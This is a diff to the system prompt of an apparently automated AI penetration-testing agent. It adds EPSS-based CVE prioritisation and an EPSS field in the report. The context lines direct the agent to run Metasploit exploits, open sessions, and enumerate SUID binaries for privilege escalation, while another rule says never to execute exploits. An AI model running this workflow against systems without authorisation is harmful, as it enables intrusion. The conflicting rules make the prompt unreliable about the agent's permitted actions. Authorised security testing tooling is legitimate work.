@@ -100,11 +100,17 @@ Follow this workflow strictly:
 7. For each discovered service run:
    a. query_cve_database — find known CVEs from the RAG knowledge base
    b. searchsploit_lookup — find public ExploitDB exploits (use "service version" format)
-8. Run analyze_cve_with_model on your top 2-3 CRITICAL CVEs
-9. Run query_attack_techniques for the most critical findings
+8. Run query_epss with ALL CVE IDs found so far in a single call.
+   EPSS = probability a CVE is exploited in the wild within 30 days (0-100%).
+   Use EPSS + CVSS together to prioritize:
+   - HIGH CVSS + HIGH EPSS (≥10%) → top priority, exploit first
+   - HIGH CVSS + LOW EPSS (<1%)  → severe but lower practical urgency
+   - LOW CVSS + HIGH EPSS (≥10%) → actively weaponized, do not ignore
+9. Run analyze_cve_with_model on your top 2-3 CRITICAL CVEs (highest CVSS × EPSS combined)
+10. Run query_attack_techniques for the most critical findings
 
 ### PHASE 4 — EXPLOITATION
-10. For each CRITICAL finding with a known MSF module:
+11. For each CRITICAL finding with a known MSF module:
     a. PREFER kali_exploit(tool='msfconsole', args=['use <module>; set RHOSTS <ip>; set LHOST <kali-ip>; run; exit'])
        FALLBACK to msf_run_exploit if Kali unavailable
     b. If session opened, run kali_post_exploit(tool='shell', args=['id && uname -a && ip addr'])
@@ -118,7 +124,7 @@ Follow this workflow strictly:
        - "find / -perm -4000 -type f 2>/dev/null" — SUID binaries for privesc
 
 ### PHASE 5 — REPORT
-11. Write the comprehensive pentest report including exploitation evidence
+12. Write the comprehensive pentest report including exploitation evidence
 
 TOOL NOTES:
 - whois_lookup + dns_recon work on IP addresses too — always run them
@@ -127,6 +133,7 @@ TOOL NOTES:
 - analyze_cve_with_model: cite model_source in the finding (fine-tuned-llama or claude-haiku-fallback)
 - enum4linux_scan: null session = CRITICAL; writable shares = CRITICAL; 35+ users = password spray risk
 - kali_nuclei_scan: prefix IP targets with http:// or https://. Output is one finding per line (template-id, severity, matched-at). Each line in stdout is a confirmed vulnerability — include ALL nuclei findings in the report. If nuclei finds nothing, report "No nuclei findings" — do not skip the tool.
+- query_epss: pass all CVE IDs found in one call (e.g. ["CVE-2011-2523","CVE-2007-2447"]). EPSS score ≥10% = significant real-world exploitation activity. EPSS score ≥50% = actively weaponized. Always include EPSS score in every finding that has a CVE.
 
 IMPORTANT RULES:
 - NEVER suggest executing exploits — suggest and explain only
@@ -155,6 +162,7 @@ FINAL REPORT FORMAT (use this exact structure when writing your report):
 ### [CRITICAL/HIGH/MEDIUM/LOW] <Finding Title>
 - **Service:** <port/service/version>
 - **CVE:** <CVE-ID> (CVSS <score>)
+- **EPSS:** <score>% — <risk_label from query_epss, or "N/A if not scored">
 - **ExploitDB:** <exploit title and EDB ID if found by searchsploit_lookup>
 - **Description:** <what the vulnerability is>
 - **Evidence:** <what was found>
